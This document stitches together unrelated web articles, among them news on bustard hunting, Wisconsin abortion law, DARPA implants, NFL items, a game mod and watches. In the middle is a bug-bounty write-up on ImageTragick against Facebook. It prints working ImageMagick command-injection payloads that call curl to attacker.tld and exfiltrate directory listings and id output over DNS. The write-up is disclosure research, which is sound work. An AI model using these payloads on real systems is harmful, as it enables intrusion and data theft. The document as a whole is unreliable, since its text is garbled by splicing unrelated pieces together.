A Saudi Arabian prince did some serious damage on a recent hunting expedition, managing during a 21-day killing spree to put a vulnerable species a few thousand deaths closer to extinction.
The Saudi royal's trip to Chagai, Balochistan this past January landed him 1,977 rare houbara bustards, reports Dawn, Pakistan's English-language newspaper. Other members of his party managed to bag 123 more. According to a report prepared by the Balochistan Forest and Wildlife Department -- "Visit of Prince Fahd bin Sultan bin Abdul Aziz Al Saud regarding hunting of houbara bustard" -- "the prince hunted the birds for 15 days in the reserved and protected areas, poached birds in other areas for six days and took rest for two days."

Pakistan's come under fire for issuing special permits to Arab rulers allowing them to hunt the birds, which are off-limits to Pakistani citizens. As the Guardian reported in February, "VIP visitors from the Gulf enjoy their traditional hunts with falcons and believe the houbara's meat has aphrodisiac properties." This year, officials issued 33 permits to trigger-happy dignitaries, including the emirs of Kuwait and Qatar and the president of the United Arab Emirates, allowing them to kill up to 100 birds each.
Helped along by overhunting, the hourbara's population has fallen in recent decades; it's considered to be at risk of extinction by the Convention on International Trade in Endangered Species.

The winters in Minnesota sure can get cold, so it's nice that one older woman in the area will get to spend the next few months with Timberwolves guard Ricky Rubio wrapped around her.
Well, at least a massive blanket bearing Rubio's likeness. The Spanish point guard retweeted one fan's amazing Christmas gift Tuesday.
Via ondeckdean:
"@rickyrubio09 Mom had a very Ricky Christmas!Grandma loves you! Feliz Navidad! pic.twitter.com/6ku0csBZ wish her a happy holiday!"
This woman received quite the amazing Christmas gift yesterday. (Photo11: @ondeckdean)
Asked by Twitter followers where he had the blanket made, the fan directed them to this site, which apparently can turn any photo into the type of amazing tapestry seen here.
Your move, Laker fans.

Catch a glimpse of the new normal and specular mapped Imperial Starfighters that you'll see in this Star Wars Total Conversion Mod for Freelancer
Posted by FW:ToW_Sushi on Jun 6th, 2011
As promised in my last News post, I said I would post the videos of our new normal and specular mapped Imperial Starfighter models. I have to say, I'm quite thrilled with the results of W0dk4's new model exporter for 3ds Max for cleaning up a bulk of the models in terms of smoothing errors as well as allowing us to put on normal and specular maps for the ships.
So, without further adieu, our Imperial Starfighter line up
TIE Fighter:
TIE Interceptor:
TIE Bomber:
TIE Avenger:
TIE Defender:
I will now begin work on our Hutt and Corellian starfighters. If there is enough demand to see videos of them, I'll post them up in the same way.
As always any comments, suggestions or questions are always welcomed!

I want to believe that all of you know about ImageMagick and its Tragick. This issue was found in the end of the April, 2016 and due to many processing plugins depends on the ImageMagick library this issue has a huge impact. Since there were evidences that information about this issue was available not only for researchers, who discovered it and ImageMagick's development team, but also for others, on the 3rd of May, 2016 the information (without PoC) was disclosed. Many of researchers got this low-hanging fruit while discovering applications which were not updated in time. But for some unknowable reason i was not among them. But this was in May:)
Once upon a time on Saturday in October i was testing some big service (not Facebook) when some redirect followed me on Facebook. It was a «Share on Facebook» dialog:
https://www.facebook.com/dialog/feed?app_id=APP_ID&link=link.example.tld&picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&name=news_name&caption=news_caption&description=news_descriotion&redirect_uri=http%3A%2F%2Fwww.facebook.com&ext=1476569763&hash=Aebid3vZFdh4UF1H
Which many of you could see. If we look closer we can see that a `picture` parameter is a url. But there isn't image url on page content like mentioned above. For example:
https://www.google.com/images/errors/robot.png
becomes:
https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&w=158&h=158&url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&cfs=1&upscale=1&_nc_hash=AQD2uvqIgAdXgWyb
First of all I thought about some kind of SSRF issue. But tests showed that url from this parameter requested from 31.13.97.* network by facebookexternalhit/1.1. Example:
nc -lvvv 8088 Connection from 31.13.97.* port 8088 [tcp/radan-http] accepted GET /exploit.png?ddfadsvdbv HTTP/1.1 User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php) Accept: */* Accept-Encoding: deflate, gzip Host: attacker.tld Connection: keep-alive
It looks like proper request from isolated server(s).
But in any case application converts image with some kind of converter and I started to dig deeper. After some tests of this parameter (one of my favorite, which brought me a lot of money - parse SVG, which is a XML by design, to get an SSRF issue from converter's instance, which not always the same as server which requested image or, if I'm in big luck, to get an XXE issue.) i was disappointed. No ones fired. ImageTragick was last hope. Although I had no hope. If you are not familiar with this issue or lazy a bit - here is a PoC url.
Simple payload exploit.png:
push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60curl "http://attacker.tld/" -d @- > /dev/null`' pop graphic-context
Drumroll… and nothing happens.
$ nc -lvvv 80
Facepalm and Okay.
- But what if… if there is just some firewall restriction? - I asked myself.
Ok. It often happens when company blocked common requests but not DNS. Let's try payload:
push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60curl "http://record_under_attacker_controled_ns_server.attacker.tld/" -d @- > /dev/null`' pop graphic-context
And result is:
IP: 31.13.*.*; NetName: LLA1-11 NAME: record_under_attacker_controled_ns_server.attacker.tld, Type: A
Whois of this IP said that:
netname: LLA1-11 descr: Facebook
Let's begin the party :)
So, application's workflow is:
Gets `picture` parameter and requests it - this request is correct and not vulnerable
Received picture passes on converter's instance which used vulnerable ImageMagick library
To be honest I tried to find common way to exploit this http request but short tests shown that either all outbound ports are closed or I will spend a lot of time to find one that will be open. And I went another way which is sufficient for PoC.
Payload:
push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl "http://$i.attacker.tld/" -d @- > /dev/null; done`' pop graphic-context
And result was:
NAME: home.attacker.tld, Type: A NAME: boot.attacker.tld, Type: 28 NAME: dev.attacker.tld, Type: 28 NAME: bin.attacker.tld, Type: A …
and so on...
`id` shell command returned:
NAME: uid=99(nobody).attacker.tld., Type: 28 NAME: groups=99(nobody).attacker.tld., Type: A NAME: gid=99(nobody).attacker.tld., Type: A
For full proof that exploit works I provided Facebook security team with result of `cat /proc/version` output which is not going to publish here.
According to Facebook's Responsible Disclosure Policy no steps deeper were taken.
Already after initial report we discussed with Neal from Facebook security team that `cat /proc/version | base64` could be more useful and some deeper research showed that `base32` is more commonly used for various techniques including DNS tunneling (see https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152).
I am glad to be the one of those who broke the Facebook.
That's all:)

Madison — Gov. Scott Walker signed a bill Friday requiring doctors who perform abortions to have hospital admitting privileges, and abortion clinics responded by immediately suing state officials over the measure.
The law — signed Friday by Walker in a private ceremony — would cut the number of clinics offering abortions in Wisconsin from four to two, and one of the remaining clinics would have to dramatically cut the number of abortions it provides, according to the operators of the clinics.
"When women don't have access to safe, legal abortions, there are health consequences and women die," said Teri Huyck, president and chief executive officer of Planned Parenthood of Wisconsin.
Backers of the law, which also requires women seeking abortions to get ultrasounds, said they were not worried about the lawsuit.
"We are confident this bill will be held to be constitutional," said Susan Armacost, legislative director for Wisconsin Right to Life.
Planned Parenthood and Affiliated Medical Services filed the lawsuit in federal court in Madison. They brought it against Attorney General J.B. Van Hollen, Dane County District Attorney Ismael Ozanne, Safety and Professional Services Secretary Dave Ross and the members of the state Medical Examining Board — all of whom have authority to enforce the law or issue sanctions.
It will be heard by U.S. District Judge William Conley. It was unclear whether he would take action before the law takes effect Monday.
Planned Parenthood has abortion clinics in Milwaukee, Madison and Appleton; Affiliated has one in Milwaukee. A fifth Wisconsin clinic that offers abortions, in Green Bay, plans to stop offering abortion services on Aug. 1 for reasons unrelated to the admitting privileges law, according to the suit.
Huyck said if the suit does not block the law, Planned Parenthood would have to close its Appleton abortion clinic and offer at least 50% fewer abortions at its Milwaukee facility. Affiliated would have to close its Milwaukee clinic, according to the suit.
That would mean abortions in Wisconsin would not be available north of Madison, and after the 19th week of pregnancy would not be available anywhere in the state, according to the suit.
The clinics are asking the court to immediately block the law, contending it violates the constitution's due process guarantee, puts an undue burden on a woman's right to choose abortion and unconstitutionally treats doctors who perform abortions differently than doctors who perform other procedures.
Challenges to similar laws in other states have had some success, at least initially. Nationally, the matter will likely ultimately be decided by higher courts, said Elizabeth Nash, the state issues manager for the Guttmacher Institute, a group that supports abortion rights.
"Even if a district court blocks a law, strikes down a law, nobody's going to give up here," Nash said. "This is going to go to the appellate court level. It's a very long row to hoe."
Rick Esenberg, president of the conservative Wisconsin Institute for Law and Liberty, agreed the matter was likely to be decided by appellate courts.
The state will likely argue it has the authority to set minimum standards for doctors who provide abortions, Esenberg said. But it is hard to know how a judge will rule on the case because of the nuances of the U.S. Supreme Court's ruling in the 1992 Planned Parenthood vs. Casey case that upheld the right to abortion but also said states can regulate the procedure.
"You have a rule under Casey in which it becomes very difficult to predict the outcome," Esenberg said.
Seven other states
With Walker's signing of the law, Wisconsin becomes the eighth state to have a hospital admitting requirement, according to Guttmacher, which closely tracks abortion laws.
Judges have blocked the requirements in Alabama and Mississippi, as well as for some clinics in Kansas. The laws were not challenged in Utah and Tennessee and remain in effect there. A judge has not ruled in a North Dakota case, and Arizona's law has yet to be implemented.
Abortion opponents pointed to the outcome in another state — Missouri — because its abortion law has been upheld by the 8th Circuit Court of Appeals. Missouri's law is not included in Guttmacher's count of states with admitting privileges laws because Missouri allows exceptions for clinics if hospitals have agreed to accept their patients for any emergencies.
The bill's proponents have said the law was aimed at providing the best available health care, but Huyck said it would make women less safe by making abortion less accessible. Women in northern Wisconsin and Michigan's Upper Peninsula already have to drive hours to get to the Appleton clinic and would have to go even farther if that clinic closed, she said.
Abortion is an outpatient service that rarely requires hospitalization, she said. When it does, patients quickly get into nearby hospitals without problems under the existing system, she said.
She said getting admitting privileges at a hospital within 30 miles would be impossible in some cases because some hospitals require physicians to admit a certain number of patients annually, and abortion doctors rarely have reason to admit patients to hospitals.
Larry Dupuis, an American Civil Liberties Union of Wisconsin attorney representing Affiliated Medical Services, said it would take that clinic months to obtain admitting privileges, if they could be obtained at all. Meanwhile, women would not be able to get abortions at its clinic.
"This clearly imposes a significant burden on women seeking abortions when abortion is perfectly legal," Dupuis said.
But Armacost of Wisconsin Right to Life said clinics should be able to get admitting privileges if they have competent doctors.
"Who are these people that they cannot even get admitting privileges at a hospital?" she said.
Assembly Speaker Robin Vos (R-Rochester) has said clinics should have done more to get admitting privileges. They should have considered the possibility the requirement could pass when it was discussed early this year, he has said.
Lester Pines, an attorney for Planned Parenthood, said Vos' comments were ridiculous.
"We're supposed to anticipate what's in the mind of Robin Vos?" he said. "Should I guess now something else in the Legislature is going to pass? Do we go to a Ouija board? Do we go to a psychic?"

The Greens have joined in a last-ditch bid to stop a gay man being deported to Pakistan. Ali Choudhry could be forced to leave his Brisbane-based partner as early as tomorrow.
Immigration Minister Scott Morrison has been presented with a petition, signed by over 120,000 people, calling on him to stop the deportation of a gay man from Brisbane to Pakistan. The Greens this morning joined calls for Morrison to intervene, saying it would be "dangerous and irresponsible" to allow the man to be deported to a country where homosexual acts are illegal. Photographer Ali Choudhry has been denied a partnership visa and could be deported to Pakistan as early as tomorrow despite being in a relationship with a Brisbane neuroscientist for four years. Choudhry, who grew up in the United States, has spent little time in Pakistan, has few contacts there and does not read the local language. Same-sex sexual acts are illegal in Pakistan and being openly gay there can lead to imprisonment. Choudhry and his partner Matthew Hynd were one of the first gay couples in Queensland to register their civil union in March 2012 before the unions were annulled by the conservative Newman government. Morrison rejected a request from Choudhry two weeks ago to overturn the Immigration Department's decision, but supporters hope the minister will change his mind in response to public pressure. Greens immigration spokesperson Sarah Hanson-Young told Crikey: "Scott Morrison is proving himself to be callous and mean-spirited by denying Ali a visa. Minister Morrison is knowingly returning an openly gay man to a country where homosexuality is a punishable offence. This is both dangerous and irresponsible. "Ali could face years of imprisonment simply because of his sexuality and that clearly puts him in danger ... I will be appealing to the minister to intervene in this case to ensure that Ali and his partner can remain in Australia and continue to build their lives together." Since last Friday, over 120,000 people have signed a petition on GetUp's "community run" website calling for him not to be deported. He was able to fund an application to the Migration Review Tribunal -- that decision is still pending -- through a crowdfunding campaign on Pozible . GetUp spokesperson Matt Levinson says the petition has "gone crazy" since it was launched last week. "It is the fastest-growing and biggest ever on Community Run," he said. Ipswich computer programmer Paul Toner, who created the petition after his wife heard an ABC radio story on Choudhry's plight, flew to Sydney this morning to deliver the petition to Morrison's office. "For me, this was clearly a case of someone facing great risk," Toner told Crikey. "Being sent to Pakistan as an openly gay man puts you under threat. If they had been a heterosexual couple they would have been able to get married and this would never have happened ... We're hoping we can convince the Immigration Department or the minister to change their mind so Ali can stay." Morrison has not responded to requests for comment. A spokesperson previously said that same-sex couples are assessed no differently to heterosexual couples when it comes to immigration matters and that the criteria for a partnership visa extend beyond a genuine, ongoing relationship. Choudhry and Hynd have said the department has not explained why their application for a partnership visa, submitted two years ago, was declined. Choudhry, who originally came to Australia to study zoology, lost all his possessions in the 2011 Brisbane floods. Although he has spent most of his life in the US he is not an American citizen.
A temporary agreement on establishing a free trade zone between the Eurasian Economic Union and Iran is expected to be signed in 2017, Chairman of the Eurasian Economic Commission Board Tigran Sargsyan said on Monday.
Negotiations between EEU and Iran on a temporary free trade zone agreement are expected to be concluded by the next EEU summit scheduled for October 11, Russian news agency Sputnik reported.
“The decision has been taken to speed up the work to sign the agreement with Iran. We expect the document to be signed in 2017,” Sargsyan told reporters following a meeting of the Eurasian Intergovernmental Council in Astana.
In June, the EEC, which is the bloc's main executive body, said the union and Iran had finished working on the text of the temporary free trade zone agreement and that the sides will continue talks on liberalizing mutual market access and coordinating tariff obligations in the near future.
Deputy minister of industries, mining and trade, Mojtaba Khosrotaj, said last month that exports to the member states of Eurasian Economic Union will either be fully exempt from customs duty or enjoy a duty cut of up to 80%.
A draft agreement between Iran and EEU was signed in Yerevan, Armenia, on July 5 after more than a year of negotiations for levying preferential export tariffs on 350 Iranian industrial products in return for 180 commodities from EEU.
The agreement was signed by Khosrotaj, who is also chairman of Trade Promotion Organization of Iran, and Trade Minister of EEU Veronica Nikishina.
Noting that the export of construction materials, including tiles and ceramics, to EEU will be subject to 80% customs duty cut, Khosrotaj added that downstream petrochemical products, cables and pipes as well as metal and glass products are to enjoy a range of tax and duty exemptions.
A Russian Agriculture Ministry's report released late June after negotiations on a temporary agreement for the creation of an Iran-EEU free trade zone said Iran is ready to make tariff concessions on a wide range of agricultural products, excluding wheat and refined oil, as well as mineral water and cigarettes.
“In its maximum proposal presented at the round, Iran demonstrated its readiness to make concessions under the terms requested by member states, in almost all items EEU is interested in, excluding wheat and refined oil, as well as mineral water and cigarettes,” the ministry was quoted as saying by Russian news agency TASS.
The EEU, comprised of Russia, Armenia, Belarus, Kazakhstan and Kyrgyzstan, is an international organization that encourages regional economic integration through the free movement of goods, services and people within the union.
The union has an integrated single market of 183 million people and a gross domestic product of over $4 trillion.
The bloc came into existence from January 1, 2015, after it superseded the Eurasian Economic Community that functioned from 2000 to 2014. The treaty on the establishment of EEU was signed by the presidents of Russia, Belarus and Kazakhstan on May 29, 2014, in Astana, the Kazakh capital.
There's more than one setup that possible on de_cache on the counter-terrorists side. It'll give you an advantage to other setups, and is going to win you more rounds on the counter-terrorist side to stay ahead. In this blog I'm going to explain three of them and why they are possible in the first place on this specific map.
Why are more than 2 generic setups possible?
This has a simple reason. The mid on de_cache is the most important spot on the whole map because it allows the terrorists to attack a bomb site from more angles, the counter-terrorists to rotate faster and retake a bomb site once it has been taken by the terrorists. There aren't really that many examples to compare it with other maps, but one would be the mid on de_dust2, as it's nearly serving the same purpose as on de_cache.
The standard setup
This setup is the one most used by pro players and ranked/PUG players. It consists of having two counter-terrorists on the B Bomb site, one in the Middle (most of the time in the Z connector), and two on the A bomb site. This is setup is completely viable for competitive play, because if the player in mid needs support from his teammates, one of the players from the B site can boost himself up in the Vent area, but this can prove fatal. If the terrorists are fast enough in taking mid (e.g killing the counter-terrorists that are holding mid or smoking him off), the player that's boosted up in the vents is going to be taken out easily by the terrorists; thus resulting in complete terrorist control of the mid area.
The other player that can support the mid player is the one that's playing forklift on A, because he can easily go down highway and support the other player that's holding mid. This setup can work out really good, but can also be completely shattered if the terrorists are taking the mid area fast and aggressive enough. In the picture down below I've added the locations and rotating players, and also the entrances that are most often smoked off by the counter-terrorists.
The 1-2-2 setup
The 1-2-2 setup is exactly what it sounds like, one player on the B bomb site, two in the mid area and two on the A site. In this setup two of the counter-terrorists are running as fast as possible in the mid area, while one is going to hold from highway, the other player goes into the vent. With this setup the terrorists are having a harder time taking the middle because they are going to face 2 angles if they want to push into the mid. The vent player can also hear terrorists that are charging into the B site and can warn the player that's spotting from the B bomb site.
The player on highway can always help the players on the A site, while the vent player can drop down any given time and surprise the terrorists that are in front of the B site and are focused on the player on the B bomb site. This setup is really effective, as it allows the counter-terrorists to hold easily mid and also allows them to rotate quicker to any given side to support the other holding counter-terrorists.
The 1-3-1 setup
This setup is the less used one of the three in the competitive scene. This setup's only goal is to lock down the mid area completely. The two players are holding from highway and from the vent, but there's also a third player holding in front of the boost area (the other players on the A and B bomb site are holding like in the 1-2-2 setup). This allows a crossfire in the mid between vent and under boost, while the player from highway is baiting the terrorists pushing mid. Keep in mind that this setup can be risky because if the terrorists are fast enough to take either of the bomb sites you are instantly in an retake scenario of that specific bomb site.
And that's it! Always keep in mind that you can switch any given time between these setups in your match. The variety is what gives you an advantage and keeps the terrorists always in the dark with not too much input to execute an site take.
The US military's shadowy research branch, Defense Advanced Research Projects Agency (DARPA), has outlined a US$65 million plan to develop advanced neural implants connecting brains to computers, in order to treat sensory deficits like blindness. The agency is just the latest body to throw its proverbial hat into the brain-computer interface ring.
In years to come, 2017 may well be remembered as the year when the attempt to merge machines and the human brain went supernova.
In March, Tesla Motors CEO Elon Musk announced the creation of Neuralink, and in April, Facebook's Building 8 division embarked on a project aimed at achieving control of computers via mere human thought.
DARPA's effort is being carried out by six research teams, including two seeking to restore vision using light-emitting diodes, one to decode speech using "neurograin" sensors, and another using holographic microscopes to detect neural activity that could replace lost vision or act as an interface to control artificial appendages.
With new $15.8M DARPA grant, Columbia engineers revolutionize brain-computer interfaces using silicon electronics. https://t.co/6jFZ4sqELi pic.twitter.com/763gPNCVKU — Columbia Engineering (@CUSEAS) July 10, 2017​
The agency hopes the four-year effort will create fully functional prototypes for demonstration, and further innovation.
While Musk and Facebook alike were light on specifics when discussing their plans, details of DARPA's project are a lot more fleshed out.
One funding recipient, Paradromics, is developing technology that will, hopefully, be able to record data from one million individual neurons inside a human brain simultaneously — an essential capability if scientists are ever to create a seamless link between the human brain and computers, which could restore lost senses. The firm has been granted US$18 million for the task.
Scientists have been able, using metal electrodes, to listen in on the electrical chatter of brain neurons for a century. However, never before have researchers managed to simultaneously record data from more than a few hundred at once in a living human brain, typically home to around 80 billion in all.
Dr. Anders Sandberg, Research Fellow at Oxford University's Future of Humanity Institute, explains new methods for recording neuron activity — such as optogenetics —have been in development for some time.
"Optogenetics uses genetic engineering to make neurons light sensitive or change color depending on their state, allowing for reading and writing using fiber optics. Other projects aim at better electrode arrays using nanofibers, or aim at 'neural dust' — tiny machines lodged in the brain that signal to a chip using ultrasound. The goal is to make something much less invasive that can talk to many more neurons," Dr. Sandberg told Sputnik.
The spoils of such a breakthrough would be manifold. By definition, as the brain is the basis for everything we humans think, feel, do and understand, the more humans understand it, the better scientists will be able to heal or improve it.
For instance, Dr. Sandberg says prosthetics are currently crude and cannot feel — this could be fixed if they were somehow connected with the nervous system. The same goes for artificial eyes, and other sensory organs.

If and when neuroscience develops to a suitable degree, telepathic communication may even be possible.
Nevertheless, even if DARPA's goal to create working archetypes bears fruit, it will likely be a great while before such devices are ready for commercial, clinical or military application. Moreover, the project is likely to be controversial — public anxiety and ethical debate over human experimentation and intrusive biotechnology is intense.
Still, Dr. Sandberg notes research in the field remains very much at the rudimentary stage, attempting to answer ostensibly basic questions, such as how the brain works, how it learns, and whether it's possible to copy it.
The road to developing a 1-million channel neural implant https://t.co/1FMwmuUhrf — Paradromics (@paradromics) July 10, 2017​
Still, if the research project is successful, science will achieve unprecedented insight into how brains function — and it's also thought these breakthroughs could help improve artificial intelligence.
In a bizarre twist, Paradromics is borrowing a technique innovated by an obscure Moldovan industrial firm in order to read large numbers of brain cells simultaneously.
The company developed a unique means of stretching hot metal and mass-producing coils of extremely thin insulated wires, a mere 20 microns thick. Paradromics will be using large numbers of extremely thin wires to penetrate the brain, but not cause damage. The wires will relay the brain's electrical signals to a microprocessor, so they can be tallied and analyzed.
If the company is successful in creating a high-density connection to the speech center of the brain, they may well be able to tap into an individual's thoughts before they become words or actions.
An obvious question is why DARPA, a military research unit, is taking an interest in mind reading.
Dr. Sandberg explains the primary military interest in such capabilities is the treatment of neurological disease, and controlling prosthetics.
"While many researchers like the coolness of being able to control aircraft by thinking and similar things, that kind of direct use is rather far away since the interfaces are invasive. It is easier to add eye tracking, voice control and other automation," Dr. Sandberg concludes.
In any event, the project is not the agency's maiden foray into brain science interfaces.
Research on a number of similar projects is ongoing as of 2017, including using implanted chips to treat mental illness and restore memories and movement to battle-wounded soldiers.
Moreover, in April, it was announced DARPA was funding eight separate projects targeting peripheral nerves with electrical stimulation, in order to boost military training regimens. For example, one project aims at speeding up the time it takes to learn a new skill (such as a foreign language) — from years to weeks.
Brooklyn Democrat Dov Hikind demanded Tuesday that Palestinian-American anti-Trump activist Linda Sarsour account for $100,000 that she helped raise for a Jewish cemetery that needs repair, but which says it has not received the money.
Hikind, a New York State Assemblyman, was responding to an article Tuesday at the Algemeiner (original emphasis and link):
A Jewish cemetery in Colorado that has fallen into severe disrepair has yet to receive a check for some $100,000 from a group associated with Palestinian-American BDS [boycott, divestment, sanctions] activist Linda Sarsour, despite being promised the money several months ago, The Algemeiner learned on Tuesday. Neal Price of the Golden Hill Cemetery in Lakewood, CO said he had left three unreturned voicemails for Tarek El-Messidi, the founder of non-profit Islamic education organization Celebrate Mercy, who led the high-profile effort by the Muslim community in February and March to raise money for vandalized Jewish cemeteries in the US. El-Messidi's partner in the effort was Sarsour.
The fundraising effort was a response to a widely-reported wave of antisemitic attacks after Donald Trump's victory in the 2016 presidential elections. Most of the attacks turned out to be hoaxes, but the anti-Trump movement sought to make maximum political use of the story. In that context, Sarsour and other activists set a goal of raising $20,000 from the Muslim community for the repair of Jewish cemeteries that had been vandalized, and exceeded their goal.
The Algemeiner noted that some of the money Sarsour raised did reach its intended targets. Specifically, $50,000 to repair two Jewish cemeteries and a synagogue that had been vandalized was indeed delivered. But the additional money that was promised for the restoration of the Golden Hill Cemetery has allegedly not yet been received.
Hikind issued a statement Tuesday evening:
“Sarsour is a fraud,” said the Assemblyman. “She talks out of both sides of her mouth. One minute she's claiming to be a disciple of the great Dr. Martin Luther King Jr., and the next she's standing with a terrorist on stage at an event [Rasmea Odeh], and singing praises of that terrorist to an audience. I won't be the least bit surprised to hear that her little Jewish cemetery publicity stunt wasn't quite what she made it out to be.” … “I understood that Sarsour's fundraiser was just a publicity stunt meant to mask her efforts to hurt the State of Israel while glorifying her terrorist pals in various Tweets and speeches,” said Hikind. “But I also hoped that the money she raised would at least help these cemeteries. After all, Sarsour has no loss of affection for dead Jews. But this new report raises questions about where the money went. Perhaps if this story gets out, the shame will cause Sarsour to direct the funds to the people it was promised to. Then again, shame implies an elevated sense of self-awareness, and someone who glorifies terrorists is rarely sullied by a scruple.”
Sarsour has not responded directly to Hikind or to the claims in the Algemeiner article. However, on Tuesday, she took to Twitter to threaten the Algemeiner with a lawsuit. She also linked to an article in May in which she responded to earlier criticisms by Hikind, proving donations to the three cemeteries that had been vandalized. (The article also said money would be given to the Colorado cemetery, but that money has allegedly not been paid.)
.@Algemeiner is just begging for a defamation lawsuit. This is not the first time I had to answer outlandish claims. https://t.co/MW9iHlMdgE — Linda Sarsour (@lsarsour) July 11, 2017
.@Algemeiner thinks they can just post whatever they want without getting the facts straight. Didn't bother asking. This is getting old. — Linda Sarsour (@lsarsour) July 11, 2017
Sarsour then went on a rant, claiming that she and her family had suffered “trauma” from what she called “lies”:
These past few months have shown there is a clear campaign to defame my character that has come with emotional & financial damage. — Linda Sarsour (@lsarsour) July 11, 2017
I can't put a price tag on the trauma that these propaganda campaigns have put on my family. People will pay w/ their pockets. — Linda Sarsour (@lsarsour) July 11, 2017
Just know that I am taking names of those who have lied about me to defame my character. I may be quiet now but not for long. I am working. — Linda Sarsour (@lsarsour) July 11, 2017
I have the unfortunate receipts of what it costs to be the target of right wing media, elected officials, prominent individuals. — Linda Sarsour (@lsarsour) July 11, 2017

This is exhausting every day. Please pray for my children who I can't shelter from the vitriol they see. — Linda Sarsour (@lsarsour) July 11, 2017
I have NO PROBLEM with folks vehemently disagreeing with me on anything BUT I do have a problem with threats & lies. That's unacceptable. — Linda Sarsour (@lsarsour) July 12, 2017
fwiw, I am not distracted. https://t.co/rkADtrBMZv — Linda Sarsour (@lsarsour) July 12, 2017
Last weekend, Sarsour sparked national criticism by calling for “jihad” against the Trump administration. She responded to her critics in an op-ed in the Washington Post, claiming that she was a victim of “Islamophobia.”
Update: Sarsour also responded Tuesday on Facebook, blaming “zionists” for the scrutiny of her donations, and indicating a third party was responsible for the $100,000, which would be donated when the cemetery had a “plan”:
I have the unfortunate receipts of what it costs to be a target of the right wing, alt-right, right wing zionists. This has caused my family great emotional stress & trauma. It's not free to keep my family safe. I just want people to know I am taking names of media outlets and prominent individuals who have used the last few months to defame my character. I may be quiet but they will pay with their pockets. Today's most recent outrageousness is questioning my integrity around the campaign to raise money for Jewish cemeteries. Algemeiner a right wing Zionist media outlet regurgitated a story that I already had responded to a few weeks ago. You can call me what you want BUT DO NOT EVER QUESTION my integrity. We set out to raise $20K and raised over $100K thanks to generosity of so many people. We ensured that the St. Louis Cemetery (the original focus) received the funds they needed, and we found others who also had incidents of vandalism, etc. The money is being administered by CelebrateMercy, NOT me. There still is money left over and Tarek El-Messidi found a cemetery in Colorado that has been in shambles for years being cared for by a legally blind man. Tarek went and visited them (you can read more in this article) and said that once they had a plan to take on this huge project Tarek would be ready with the funds. I am exhausted. I am tired of the lies, lies, and more lies. It's too much and it reignites the most vitriolic human beings on this earth. I am not safe and someone will pay for this with their pockets. Big time.

YUKON, Okla. – A sixth grader in Oklahoma wrote letters to the owners of 32 NFL team asking why he should be a fan. The 12-year-old, Cade Pope, had formerly been a St. Louis Rams fan, but was looking for a new team to root for.
According to News On 6 in Oklahoma, Pope's mother, Heather, said her son hand wrote the letters two weeks ago and mailed them to the team owners.
Last week, Pope received a single response from one of the most powerful NFL team owners, Jerry Richardson, who founded the Carolina Panthers over 20 years ago.
According to News On 6, Richardson reportedly wrote:
“Cade we would be honored if our Carolina Panthers became your team, we would make you proud by the classy way we would represent you.”
With his hand written response, he listed several players he wanted Pope to watch for. Richardson also included a replica team helmet for Pope.
I know a number of people were curious if the Giants ended up as the least consistent team in DVOA history. Not quite… — Aaron Schatz (@FO_ASchatz) 3 Jan 13
Coach Tom Coughlin said this week that it was an indescribable feeling not to be in the playoffs. The Giants outscored their opponents by a healthy number, 429-344. (It's easy to overlook this statistic from their 2011 Super Bowl season, but the Giants were outscored in the regular season, 400-394.)
This season, the Giants also finished at No. 10 in the Advanced NFL Stats efficiency rankings and at No. 7 in the Football Outsiders final DVOA ratings.
But Giants fans probably won't be surprised by another statistic from Football Outsiders. Its editor-in-chief, Aaron Schatz, has them with the fourth-highest DVOA variance, a measure of inconsistency, since 1991. You just never knew which team you'd get.
This week, the Giants' quarterback, general manager and coach recapped the season in radio interviews, and one of the common themes was the impact of the injuries to receiver Hakeem Nicks, who broke a foot before the season and then injured a knee in Week 2. Giants General Manager Jerry Reese said the team might have made a mistake by letting him play so much.
Eli Manning assessing his season, on WFAN, via SportsRadioInterviews.com:
“I don't think it was as good as it needed to be. I think there were a couple games where it just wasn't as on, and I needed to play better. I think not having Hakeem 100 percent for most of the season, really the last 10 weeks, can hurt. And he's out there playing hurt, and you love that toughness about it, that he wants to be out there. But it just made it tough when you're starting a receiver who's got to win those one-on-one matchups, and your deep threat and your playmaker all of a sudden kind of isn't making the deep plays and the big plays. It can be tough to adjust to that. And I think just our timing was off on a number of things.”
Reese on ESPN Radio:
“Hakeem Nicks has been one of the linchpins in our offense. He was banged up, and I really think it took its toll on our offense and what we are trying to do. He was trying to fight through it. But in hindsight, I think if we had to think about it again, maybe we would have taken him out a little quicker than we did. But that is neither here nor there at this point. But I do think it affected the quarterback's play some.”
Coughlin on WFAN:
“I think it's important that Hakeem comes back and is the player that he was a year ago. And we need that desperately to happen. Not only because of what an impact he makes on the game but also because of the versatility that is created by having Randle and Cruz.”

First: Ain't a damn thing wrong with quartz. But there is certainly something wrong with someone projecting their tastes in watches (or clothing, or shoes) onto others in the form of snobbery. There's hardly anything more insufferable than a watch snob who just aches to have someone notice what's on his wrist.
Second: There's just something about automatic and mechanical watches. It's hard not to be impressed by their movements powered by tension, springs, and gears, all without the aid of that newfangled source of power known as “electricity”. To some (and not all), they're the difference between candlelight and a dimmer switch. They might sometimes look the same, but the romance is superior with the former.
No matter what camp you're in, the following are all lookers for less than what the dude in the corner office is sporting (& is hoping you notice at lunch). As always, buy and wear what you like and can afford. Hard to go wrong there.
Small in stature and price, but big on variety, quality, and wearability. Kryptonite to the quartz J. Crew Timex Military watch. 21 Jewel movement, Scratch resistant Harlex mineral crystal, and budget friendly price. At 37mm in diameter it's small, but still well loved by plenty. (Photo credit: Michael Pollak.)
One of the best, and hugely difficult to find. Comes with a stainless steel band but looks incredible if you swap that out for leather, a fabric NATO, or even a silicone strap. More on this line over here.
Sea-Gull makes a full quarter of the world's automatic watches. They are the biggest. And while a lot of their designs can drift into the strange, they've got a couple option that look like they were pulled straight from an estate sale.
